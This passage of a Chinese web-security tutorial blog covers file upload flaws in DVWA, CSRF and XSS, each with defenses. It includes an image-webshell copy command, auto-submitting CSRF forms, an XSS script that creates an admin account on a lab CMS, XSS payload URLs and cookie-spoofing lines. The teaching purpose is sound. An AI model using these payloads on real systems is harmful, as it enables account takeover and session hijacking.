class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-4-2-代码审计"><a href="#3-4-2-代码审计" class="headerlink" title="3.4.2  代码审计"></a><strong>3.4.2</strong>  <strong>代码审计</strong></h3><ul><li><p>上传文件没有重命名；</p></li><li><p>文件后缀名白名单检测；</p></li><li><p>使用getimagesize() 进行文件内容检测，只检测文件头部。</p></li></ul><h2 id="3-5-图片木马"><a href="#3-5-图片木马" class="headerlink" title="3.5 图片木马"></a><strong>3.5</strong> 图片木马</h2><h3 id="3-5-1-使用cmd命令"><a href="#3-5-1-使用cmd命令" class="headerlink" title="3.5.1  使用cmd命令"></a><strong>3.5.1</strong>  <strong>使用</strong>cmd命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy  imgName/b+yjh/a  newImgName</span><br></pre></td></tr></table></figure><h2 id="3-6-完全防御"><a href="#3-6-完全防御" class="headerlink" title="3.6 完全防御"></a><strong>3.6</strong> 完全防御</h2><h3 id="3-6-1-源代码"><a href="#3-6-1-源代码" class="headerlink" title="3.6.1  源代码"></a><strong>3.6.1</strong>  <strong>源代码</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// File information</span></span><br><span class="line"><span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_ext</span>   = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line"><span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line"><span class="variable">$uploaded_tmp</span>   = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Where are we going to be writing to?</span></span><br><span class="line"><span class="variable">$target_path</span>= DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line"><span class="comment">//$target_file= basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line"><span class="variable">$target_file</span>=   <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"><span class="variable">$temp_file</span>= ( ( <span class="title function_ invoke__">ini_get</span>( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( <span class="title function_ invoke__">sys_get_temp_dir</span>() ) : ( <span class="title function_ invoke__">ini_get</span>( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line"><span class="variable">$temp_file</span>.= DIRECTORY_SEPARATOR . <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is it an image?</span></span><br><span class="line"><span class="keyword">if</span>( ( <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || <span class="title function_ invoke__">strtolower</span>(</span><br><span class="line"><span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;</span></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>( <span class="variable">$uploaded_tmp</span> ); <span class="title function_ invoke__">imagejpeg</span>( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefrompng</span>( <span class="variable">$uploaded_tmp</span> ); <span class="title function_ invoke__">imagepng</span>( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>( <span class="variable">$img</span> );</span><br><span class="line"><span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">rename</span>( <span class="variable">$temp_file</span>, ( <span class="title function_ invoke__">getcwd</span>() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line"><span class="comment">// Yes!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// No</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Delete any temp files</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">file_exists</span>( <span class="variable">$temp_file</span> ) ) <span class="title function_ invoke__">unlink</span>( <span class="variable">$temp_file</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Invalid file</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>; &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token generateSessionToken();</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-6-2-代码审计"><a href="#3-6-2-代码审计" class="headerlink" title="3.6.2  代码审计"></a><strong>3.6.2</strong>  <strong>代码审计</strong></h3><ul><li><p>检测Token 值，防止数据包重放；</p></li><li><p>文件重命名；</p></li><li><p>文件后缀名白名单检测；</p></li><li><p>文件类型白名单检测；</p></li><li><p>文件内容头部检测；</p></li><li><p>二次渲染，生成新文件；</p></li><li><p>删除缓存文件。</p></li></ul><h2 id="3-7-文件上传利用条件"><a href="#3-7-文件上传利用条件" class="headerlink" title="3.7 文件上传利用条件"></a>3.7 文件上传利用条件</h2><p>文件上传漏洞完美利用，受到以下条件限制：</p><ul><li><p>Web 服务器开启文件上传功能，Web 用户可以使用该功能。</p></li><li><p>Web 用户({www|www-data|apache})对目标目录具有可写权限，甚至具有执行权限。一般情况下，Web 目录都有执行权限。</p></li><li><p>完美利用意味着文件可以执行，也就是说代码可以被服务器解析。</p></li><li><p>服务器开启了PUT 方法。</p></li></ul><h2 id="3-8-任意文件上传防御"><a href="#3-8-任意文件上传防御" class="headerlink" title="3.8 任意文件上传防御"></a>3.8 任意文件上传防御</h2><h3 id="3-8-1-代码角度"><a href="#3-8-1-代码角度" class="headerlink" title="3.8.1  代码角度"></a><strong>3.8.1</strong>  <strong>代码角度</strong></h3><ul><li><p>采用白名单策略，严格限制上传文件的后缀名；</p></li><li><p>上传文件重命名，尽量少的从客户端获取信息，包括文件名、文件类型、文件内容等；</p></li><li><p>文件内容检测；</p></li><li><p>进行二次渲染，过滤掉图片马中的恶意代码；</p></li><li><p>避免文件包含漏洞；</p></li><li><p>严格处理文件路径，防御00 截断漏洞；</p></li><li><p>检测Token 值，防止数据包重放。</p></li></ul><h3 id="3-8-2-业务角度"><a href="#3-8-2-业务角度" class="headerlink" title="3.8.2  业务角度"></a><strong>3.8.2</strong>  <strong>业务角度</strong></h3><p>强口令策略，避免恶意攻击者登录网站后台；尽量避免Web 用户修改上传白名单。</p><h3 id="3-8-3-Web-容器角度"><a href="#3-8-3-Web-容器角度" class="headerlink" title="3.8.3  Web 容器角度"></a><strong>3.8.3</strong>  <strong>Web</strong> <strong>容器角度</strong></h3><p>及时更新Web 容器，防止解析漏洞产生。禁用Web 容器PUT 方法。</p><h3 id="3-8-4-系统角度"><a href="#3-8-4-系统角度" class="headerlink" title="3.8.4  系统角度"></a><strong>3.8.4</strong>  <strong>系统角度</strong></h3><p>避开空格、点 .  、 ::$DATA 等windows 系统特性。</p><h3 id="3-8-5-服务器部署"><a href="#3-8-5-服务器部署" class="headerlink" title="3.8.5  服务器部署"></a><strong>3.8.5</strong>  <strong>服务器部署</strong></h3><p>严格控制权限，执行权限与写权限分离。</p><p>建立单独的文件存储服务器，类似于站库分离。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>跨站请求伪造（csrf）</title>
      <link href="/2022/11/10/%E6%BC%8F%E6%B4%9E/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88csrf%EF%BC%89/"/>
      <url>/2022/11/10/%E6%BC%8F%E6%B4%9E/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88csrf%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-CSRF-概述"><a href="#1-CSRF-概述" class="headerlink" title="1.CSRF 概述"></a>1.<strong>CSRF</strong> 概述</h1><h2 id="1-1-CSRF-原理"><a href="#1-1-CSRF-原理" class="headerlink" title="1.1  CSRF 原理"></a><strong>1.1</strong>  <strong>CSRF</strong> 原理</h2><h3 id="1-1-1-基本概念"><a href="#1-1-1-基本概念" class="headerlink" title="1.1.1  基本概念"></a><strong>1.1.1</strong>  <strong>基本概念</strong></h3><p>​跨站请求伪造（Cross Site Request Forgery，CSRF）是一种攻击，它强制浏览器客户端用户在当前对其进行身份验证后的Web 应用程序上执行非本意操作的攻击，攻击的重点在于更改状态的请求，而不是盗取数据，因为攻击者无法查看伪造请求的响应。</p><p>​借助于社工的一些帮助，例如，通过电子邮件或聊天发送链接，攻击者可以诱骗用户执行攻击者选择的操作。如果受害者是普通用户，则成功CSRF 攻击可以强制用户执行更改状态的请求，例如转移资金、修改密码等操作。如果受害者是管理账户，CSRF 攻击会危及整个Web 应用程序。</p><h3 id="1-1-2关键点"><a href="#1-1-2关键点" class="headerlink" title="1.1.2关键点"></a>1.1.2<strong>关键点</strong></h3><ul><li><p>受害者没有退出登录，受害者保持身份认证。</p></li><li><p>CSRF 继承了受害者的身份和特权，代表受害者执行非本意的、恶意的操作。</p></li><li><p>CSRF 会借用浏览器中与站点关联的所有身份凭据，例如用户的会话Cookie，IP 地址，Windows 域凭据等。</p></li></ul><h3 id="1-1-3-目标"><a href="#1-1-3-目标" class="headerlink" title="1.1.3  目标"></a><strong>1.1.3</strong>  <strong>目标</strong></h3><p>CSRF 的目标是更改用户账户的状态，攻击者利用CSRF 发送的请求都是更改状态的请求，比如，转账、更改密码，购买商品等等。CSRF 的场景中，攻击者是没有办法获得服务器的响应</p><h2 id="1-2-CSRF-场景"><a href="#1-2-CSRF-场景" class="headerlink" title="1.2 CSRF 场景"></a><strong>1.2</strong> <strong>CSRF</strong> 场景</h2><h3 id="1-2-1-银行账户转账"><a href="#1-2-1-银行账户转账" class="headerlink" title="1.2.1  银行账户转账"></a><strong>1.2.1</strong>  <strong>银行账户转账</strong></h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230828192701169.png" alt="image-20230828192701169"></p><h3 id="1-2-2-构造虚假网站"><a href="#1-2-2-构造虚假网站" class="headerlink" title="1.2.2  构造虚假网站"></a><strong>1.2.2</strong>  <strong>构造虚假网站</strong></h3><p>构造CSRF 攻击连接。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta</span><br><span class="line">&lt;img charset=&#x27;utf-8&#x27;&gt; src=&#x27;./1.jpg&#x27;&gt;&lt;br/&gt;</span><br><span class="line">&lt;img src=&#x27;http://10.4.7.130/bank/action.php? username=hacker&amp;money=100&amp;submit=%E4%BA%A4%E6%98%93&#x27; alt=&#x27;宝刀在手，谁与争锋&#x27;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>攻击者通过 <img>  标签构造GET 请求。</p></li><li><p>浏览器根据 <img>  标签中的 SRC  属性，请求服务器资源，会自动带上身份认证信息。</p></li></ul><h3 id="1-2-3-场景建模"><a href="#1-2-3-场景建模" class="headerlink" title="1.2.3  场景建模"></a><strong>1.2.3</strong>  <strong>场景建模</strong></h3><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230828192911086.png" alt="image-20230828192911086"></p><h2 id="1-3-CSRF-类别"><a href="#1-3-CSRF-类别" class="headerlink" title="1.3 CSRF 类别"></a><strong>1.3</strong> <strong>CSRF</strong> 类别</h2><h3 id="1-3-1-POST-方式"><a href="#1-3-1-POST-方式" class="headerlink" title="1.3.1  POST 方式"></a><strong>1.3.1</strong>  <strong>POST</strong> <strong>方式</strong></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&#x27;csrf&#x27;</span><span class="attr">action</span>=<span class="string">&#x27;http://10.4.7.130/bank/action.php&#x27;</span>  <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;username&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;hacker&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;hidden&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;money&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;100&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">csrf</span>.<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./1.jpg&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;a href=&#x27;javascript:document.csrf.submit()&#x27; style=&#x27;color:red;font-size:100px&#x27;&gt;宝刀在手，谁与争锋&lt;/a&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><h2 id="1-4-CSRF-验证"><a href="#1-4-CSRF-验证" class="headerlink" title="1.4 CSRF 验证"></a><strong>1.4</strong> <strong>CSRF</strong> 验证</h2><h3 id="1-4-1-CSRF-PoC-generator"><a href="#1-4-1-CSRF-PoC-generator" class="headerlink" title="1.4.1  CSRF PoC generator"></a><strong>1.4.1</strong>  <strong>CSRF</strong> <strong>PoC</strong> <strong>generator</strong></h3><p>Burp Suite 自带插件，可以根据请求构造表单，进行CSRF 漏洞验证。</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230828193610276.png" alt="image-20230828193610276"></p><h1 id="2-CSRF-攻防"><a href="#2-CSRF-攻防" class="headerlink" title="2.CSRF 攻防"></a>2.<strong>CSRF</strong> 攻防</h1><h2 id="2-1-CSRF-实战"><a href="#2-1-CSRF-实战" class="headerlink" title="2.1 CSRF 实战"></a><strong>2.1</strong> <strong>CSRF</strong> 实战</h2><h3 id="2-1-1-与XSS漏洞相结合"><a href="#2-1-1-与XSS漏洞相结合" class="headerlink" title="2.1.1  与XSS漏洞相结合"></a><strong>2.1.1</strong>  <strong>与XSS漏洞相结合</strong></h3><p>攻击者可以利用XSS 触发CSRF 攻击。因为，可以利用JS 发送HTTP 请求。经过研究受害网站的业务流程，可以构造如下代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">xmlhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); xmlhttp.<span class="title function_">open</span>(<span class="string">&quot;post&quot;</span>,<span class="string">&quot;http://10.4.7.1/cms/admin/user.action.php&quot;</span>,<span class="literal">false</span>); xmlhttp.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">xmlhttp.<span class="title function_">send</span>(<span class="string">&quot;act=add&amp;username=cgjil&amp;password=123456&amp;password2=123456&amp;button=%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7</span></span><br><span class="line"><span class="string">&amp;userid=0&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-2-CSRF-防御"><a href="#2-2-CSRF-防御" class="headerlink" title="2.2 CSRF 防御"></a><strong>2.2</strong> <strong>CSRF</strong> 防御</h2><h3 id="2-2-1-无效防御"><a href="#2-2-1-无效防御" class="headerlink" title="2.2.1  无效防御"></a><strong>2.2.1</strong>  <strong>无效防御</strong></h3><ul><li><p>使用秘密的Cookie。</p></li><li><p>仅接收POST 请求。</p></li><li><p>多步交易：多步交易，有可能会被恶意攻击者预测。</p></li><li><p>URL 重写：用户的身份信息会暴露在URL 中，不建议通过引入另外一个漏洞来解决当前漏洞。</p></li><li><p>HTTPS：所有安全机制的前提。</p></li></ul><h3 id="2-2-2-有效防御"><a href="#2-2-2-有效防御" class="headerlink" title="2.2.2  有效防御"></a><strong>2.2.2</strong>  <strong>有效防御</strong></h3><p>验证Referer 字段：</p><ul><li>前URL 的上一个URL；</li><li>转账页面到转账操作；</li><li>伪造？</li></ul><p>添加Token 验证：</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/image-20230828194048778.png" alt="image-20230828194048778"></p><p>二次验证：在关键操作之前，再输入密码或者验证码。</p><p>HttpOnly：某些情况下禁止JS 脚本访问Cookie 信息。</p><p>SameSite：Cookie 属性，浏览器自带安全机制。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/"/>
      <url>/2022/11/08/%E6%BC%8F%E6%B4%9E/xss/</url>
      
        <content type="html"><![CDATA[<h2 id="1-跨站脚本攻击"><a href="#1-跨站脚本攻击" class="headerlink" title="1.跨站脚本攻击"></a>1.跨站脚本攻击</h2><h3 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1  漏洞概述"></a><strong>1.1</strong>  漏洞概述</h3><p>​跨站点脚本（Cross Site Scripting， XSS）是指通过利用网页开发遗留下俩的漏洞，在客户端代码注入攻击，攻击者可以在合法网站或Web 应用程序中执行恶意脚本。当web 应用程序在其生成的输出中使用未经验证或未编码的用户输入时，就会发生XSS。</p><p>​跨站脚本攻击，XSS (Cross Site Scripting)。由于与CSS (Cascading Style Sheet) 重名，所以就更名为XSS。</p><p>​XSS 作为OWASP TOP 10（2017）内容之一，主要使用JavaSript 来完成恶意攻击的行为，JS 可以非常灵活的操纵HTML、CSS、浏览器，这就使得XSS 攻击“想象”空间非常大。也就是说，JS 强大的灵活性和功能，为XSS 攻击提供了非常广阔的攻击面。</p><h3 id="1-2-XSS-漏洞原理"><a href="#1-2-XSS-漏洞原理" class="headerlink" title="1.2 XSS 漏洞原理"></a><strong>1.2</strong> <strong>XSS</strong> 漏洞原理</h3><h4 id="1-2-1-攻击模型"><a href="#1-2-1-攻击模型" class="headerlink" title="1.2.1  攻击模型"></a><strong>1.2.1</strong>  <strong>攻击模型</strong></h4><p>​XSS 通过将精心构造的代码（JavaScript）注入到网页中，并由浏览器解释运行这段JS 代码，以达到恶意攻击的效果。当用户访问被XSS 脚本注入过的网页，XSS 脚本就会被提取出来，用户浏览器就会解析执行这段代码，也就是说用户被攻击了。整个XSS 攻击过程，涉及三个角色：</p><ul><li><p>服务器</p></li><li><p>攻击者</p></li><li><p>客户端浏览器用户（前端）</p><p><img src="https://gitee.com/gxxlovehqy/cartographic-bed/raw/master/img/clip_image029-1693013949472.gif" alt="img"></p></li></ul><p><strong>注意：</strong></p><ul><li><p>搜索框、登录框、微博、留言板、聊天室等等收集用户输入的地方，都有可能被注入XSS 代码，都存在遭受XSS 的风险。等待受害者访问被注入恶意代码的页面，很被动，盲打。</p></li><li><p>XSS 攻击目标是客户端浏览器用户，由于浏览器的类别不同，攻击效果不同，甚至于同一款浏览器，攻击效果都不一样。</p></li></ul><h3 id="1-3-XSS-漏洞危害"><a href="#1-3-XSS-漏洞危害" class="headerlink" title="1.3 XSS 漏洞危害"></a><strong>1.3</strong> <strong>XSS</strong> 漏洞危害</h3><blockquote><p>XSS 是利用JS 代码实现攻击，有很多危害：</p><ul><li><p>盗取各种用户账号；</p></li><li><p>窃取用户Cookie 资料，</p></li><li><p>冒充用户身份进入网站；</p></li><li><p>劫持用户会话执行任意操作；</p></li><li><p>刷流量，执行弹窗广告；</p></li><li><p>传播蠕虫病毒；</p></li></ul></blockquote><h3 id="1-4-XSS-漏洞验证"><a href="#1-4-XSS-漏洞验证" class="headerlink" title="1.4 XSS 漏洞验证"></a><strong>1.4</strong> <strong>XSS</strong> 漏洞验证</h3><p>可以使用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做POC（Proof of Concept）。验证XSS 漏洞存在的POC 如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>如果页面弹窗，浏览器把用户提交的字符串当做JS 来执行，并且执行成功，说明XSS 漏洞存在。</p><h3 id="1-5-XSS-漏洞分类"><a href="#1-5-XSS-漏洞分类" class="headerlink" title="1.5  XSS 漏洞分类"></a><strong>1.5</strong>  <strong>XSS</strong> 漏洞分类</h3><ul><li><p>反射型XSS(非持久型)</p></li><li><p>存储型XSS </p></li><li><p>DOM 型XSS</p></li></ul><h4 id="1-5-1-反射型XSS"><a href="#1-5-1-反射型XSS" class="headerlink" title="1.5.1  反射型XSS"></a><strong>1.5.1</strong>  <strong>反射型</strong>XSS</h4><p>​非持久性、参数型的跨站脚本。反射型XSS 的代码在Web 应用的参数中，例如搜索框的反射型XSS。</p><pre><code>     注意到，反射型XSS 代码出现在keywords 参数中。</code></pre><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.4.7.130/cms/search.php? keywords=%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E&amp;button=%E6%90%9C%E7%B4%A2 </span><br></pre></td></tr></table></figure><p>​容易被发现，利用难度高，很多漏洞提交平台不收反射型XSS 漏洞。 </p><h4 id="1-5-2-存储型XSS"><a href="#1-5-2-存储型XSS" class="headerlink" title="1.5.2  存储型XSS"></a><strong>1.5.2</strong>  <strong>存储型</strong>XSS</h4><p>​持久性跨站脚本。持久性体现在XSS 代码不是在某个参数（变量）中，而是写进数据库或文件等可以永久保存数据的介质中。存储型XSS 通常发生在留言板等地方，可以在留言板位置进行留言，将恶意代码写进数据库中。</p><p>​危害面比较广，漏洞提交平台会接收此类漏洞。</p><h4 id="1-5-3DOM型XSS"><a href="#1-5-3DOM型XSS" class="headerlink" title="1.5.3DOM型XSS"></a><strong>1.5.3</strong>DOM<strong>型XSS</strong></h4><p>​DOM 型XSS 是一种XSS 攻击，其中攻击的代码是由于修改受害者浏览器页面的DOM 树而执行的。特殊的地方就是攻击代码(payload) 在浏览器本地修改DOM 树而执行，并不会将payload 上传到服务器，这也使得DOM 型XSS 比较难以检测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.4.7.130/xss_test/DOM-XSS/?message=%3Cscript%3Ealert(/xss/)%3C/script%3E </span><br><span class="line">http://10.4.7.130/xss_test/DOM-XSS/#message=%3Cscript%3Ealert(/xss/)%3C/script%3E</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li><p>修改DOM 树执行；</p></li><li><p>采用# 号的方式，参数不会提交到服务器。</p></li></ul><h2 id="2-XSS-攻防案例"><a href="#2-XSS-攻防案例" class="headerlink" title="2.XSS 攻防案例"></a>2.<strong>XSS</strong> 攻防案例</h2><h3 id="2-1-固定会话"><a href="#2-1-固定会话" class="headerlink" title="2.1  固定会话"></a><strong>2.1</strong>  固定会话</h3><h4 id="2-1-1-原理"><a href="#2-1-1-原理" class="headerlink" title="2.1.1  原理"></a><strong>2.1.1</strong>  <strong>原理</strong></h4><p>​用户会话令牌利用Cookie 来实现的，Cookie 是存储在浏览器端的一小段文本，相当于身份证，会有窃取和欺骗的风险。可以利用XSS 攻击窃取到浏览器里的Cookie 信息。</p><p>​由于XXS 触发需要浏览器客户端用户（受害者）参与，攻击者不清楚何时何地会触发漏洞，这个过程一般被成为XSS 盲打。</p><h4 id="2-1-2-xss平台"><a href="#2-1-2-xss平台" class="headerlink" title="2.1.2  xss平台"></a><strong>2.1.2</strong>  xss<strong>平台</strong></h4><p><img src="/xss.assets/clip_image089-1693013949473.gif" alt="img"></p><h4 id="2-1-3-窃取"><a href="#2-1-3-窃取" class="headerlink" title="2.1.3  窃取"></a><strong>2.1.3</strong>  <strong>窃取</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin; userid=1; PHPSESSID=b09m2i6ppthmqqg26no26co6m3</span><br></pre></td></tr></table></figure><h4 id="2-1-4-欺骗"><a href="#2-1-4-欺骗" class="headerlink" title="2.1.4  欺骗"></a><strong>2.1.4</strong>  <strong>欺骗</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.cookie = &#x27;username=admin&#x27;; document.cookie = &#x27;userid=1&#x27;;</span><br><span class="line"></span><br><span class="line">document.cookie = &#x27;PHPSESSID=b09m2i6ppthmqqg26no26co6m3&#x27;;</span><br></pre></td></tr></table></figure><h4 id="2-1-5-影响"><a href="#2-1-5-影响" class="headerlink" title="2.1.5  影响"></a><strong>2.1.5</strong>  <strong>影响</strong></h4><ul><li><p>黑客可以利用Cookie 